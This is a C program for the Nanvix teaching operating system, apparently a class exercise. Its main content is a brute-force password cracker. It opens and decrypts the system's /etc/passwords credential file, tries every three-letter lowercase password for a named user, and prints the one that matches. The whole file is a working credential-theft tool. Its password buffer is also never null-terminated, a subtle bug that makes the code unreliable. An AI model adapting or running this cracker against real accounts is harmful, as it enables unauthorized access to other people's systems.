#include <errno.h>
#include <limits.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <nanvix/accounts.h>
#include <string.h>

/**
 * @brief Authenticates a user in the system.
 *
 * @param name     User name.
 * @param password User's password.
 *
 * @returns One if the user has authentication and zero otherwise.
 */
static int authenticate(const char *name, const char *password)
{
    int ret;          /* Return value.    */
    int file;         /* Passwords file.  */
    struct account a; /* Working account. */

    ret = 1;

    /* Open passwords file. */
    if ((file = open("/etc/passwords", O_RDONLY)) == -1)
    {
        fprintf(stderr, "cannot open password file\n");
        return (0);
    }

    /* Search in the  passwords file. */
    while (read(file, &a, sizeof(struct account)))
    {
        account_decrypt(a.name, USERNAME_MAX, KERNEL_HASH);

        /* No this user. */
        if (strcmp(name, a.name))
            continue;

        account_decrypt(a.password, PASSWORD_MAX, KERNEL_HASH);

        /* Found. */
        if (!strcmp(password, a.password))
        {
            setgid(a.gid);
            setuid(a.uid);
            goto found;
        }
    }

    ret = 0;
    

found:

    /* House keeping. */
    close(file);

    return (ret);
}

char *crack(char *username)
{
    char *password = malloc(PASSWORD_MAX);
    char *alphabet = "abcdefghijklmnopqrstuvwxyz";

    for (int i = 0; i < 26; i++)
    {
        password[0] = alphabet[i];

        for (int j = 0; j < 26; j++)
        {
            password[1] = alphabet[j];

            for (int k = 0; k < 26; k++)
            {
                password[2] = alphabet[k];
                if (authenticate(username, password))
                    return password;
            }
        }
        printf("i = %d\n", i);
    }
    return NULL;
}

int main(int argc, char ** argv)
{
    if (argc < 2) {
        printf("USAGE : crack [user]\n");
        return 0;
    }
    char *password_found = crack(argv[1]);
    if (password_found != NULL)
    {
        printf("Password found: %s\n", password_found);
        return (EXIT_SUCCESS);
    }
    printf("Password not found\n");
    return EXIT_FAILURE;
}